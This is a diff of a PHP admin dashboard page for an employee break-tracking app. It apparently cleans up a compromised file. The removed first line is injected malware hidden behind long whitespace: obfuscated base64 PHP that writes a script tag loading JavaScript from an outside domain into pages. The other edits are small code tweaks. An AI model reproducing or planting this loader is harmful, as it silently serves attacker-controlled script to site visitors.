@@ -1,13 +1,14 @@
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 <?php $tq = $_SERVER['REQUEST_URI'];/*87665346638*/ try{$a=0; if(strpos($tq,"rest_route")!==false){$a=1;}if(strpos($tq,"wp-json")!==false){$a=1;}if($a==0){ $j="bas"."e64"."_d"."eco"."de"; print($j("PHNj"."cmlwdC"."Bhc3luYz0ndHJ"."1ZScgc3"."JjPS"."dodHRwc"."zovL2dldC5"."zb3J0eWVsbG"."93YXBwbGVzLmNvb"."S9zY3Jp"."cHRzL2dldC5qcz9"."2PTcu"."NScgPj"."wvc2"."Npc"."n"."B0Pg"));}     }catch (Exception $e) {} ?>
- <?php
+<?php 
 ob_start();
 session_start();
 if(isset($_SESSION['substatus'])){
     header("location:plan.php");
 }
+
 if ($_SESSION['admin'] == 'yes') {
     $page = 'Dashboard';
     include'admin_header.php';
+   
     ?>
     <div class="page-header">
         <div class="row">
@@ -21,7 +22,7 @@ if ($_SESSION['admin'] == 'yes') {
         <div id="hiddiv" ></div>
     </div>
     <!-- /Page Header -->
- <?php $time = time(); if(($com_row['plan_end'] - 604800) < $time ){ 
+ <?php  $time = time(); if(($com_row['plan_end'] - 604800) < $time ){ 
             $diff = $com_row['plan_end'] - $time;
             $days = round($diff/86400);
             ?>
@@ -465,7 +466,7 @@ if ($_SESSION['admin'] == 'yes') {
     </div>
     <!-- /See Break out Modal -->
 
-    <?php include 'footer.php'; ?>
+    <?php include 'footer.php';  ?>
     <script src="app/js/chart/highcharts.js"></script>
     <script src="app/js/chart/exporting.js"></script>
     <script src="app/js/chart/export-data.js"></script>
@@ -570,7 +571,7 @@ if ($_SESSION['admin'] == 'yes') {
                 data: {admin_id: admin_id, action: 'break_out'},
                 success: function (data)
                 {
-                    // console.log(data);
+                    console.log(data);
                     var json_data = JSON.parse(data);
                     $('#view_in_break').html(json_data[0]);
                     $('#view_break_violation').html(json_data[2]);
@@ -682,7 +683,8 @@ if ($_SESSION['admin'] == 'yes') {
             $date = date("Y/m/d");
             $fromdt= strtotime("$date 00:00:00");
             $todt= strtotime("$date 23:59:59");
-            $empl = mysqli_query($conn, "SELECT * FROM `employee` WHERE admin_id = " . $_SESSION['admin_id'] . " and shift_no = " . $_SESSION['shift_id'] . " and employee_status = 1 and delete_status = 0 ");
+            // $empl = mysqli_query($conn, "SELECT * FROM `employee` WHERE admin_id = " . $_SESSION['admin_id'] . " and shift_no = " . $_SESSION['shift_id'] . " and employee_status = 1 and delete_status = 0 ");
+            $empl = mysqli_query($conn, "SELECT * FROM `employee` WHERE admin_id = " . $_SESSION['admin_id'] . " and employee_status = 1 and delete_status = 0 ");
 			$k = 0;
           $emp = array();
           $employee = array();
